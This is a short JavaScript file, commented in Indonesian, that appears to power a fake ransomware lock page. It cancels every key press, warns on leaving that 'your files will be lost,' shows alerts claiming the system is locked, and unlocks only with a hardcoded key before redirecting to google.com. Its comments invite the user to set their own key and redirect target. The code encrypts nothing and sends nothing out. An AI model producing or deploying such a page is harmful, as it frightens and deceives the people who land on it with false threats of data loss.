document.addEventListener("keydown", function(event) {
    event.preventDefault(); // Mencegah pengguna keluar dengan tombol keyboard
});

window.addEventListener("beforeunload", function (event) {
    event.returnValue = "⚠️ Your files will be lost if you leave! ⚠️";
});

function checkKey() {
    let key = document.getElementById("keyInput").value;
    let correctKey = "12092010"; // Ganti dengan key yang kamu mau

    if (key === correctKey) {
        alert("✅ System Unlocked!");
        window.location.href = "https://google.com"; // Bisa diarahkan ke mana saja
    } else {
        alert("❌ WRONG KEY! Your system is still locked!");
    }
}
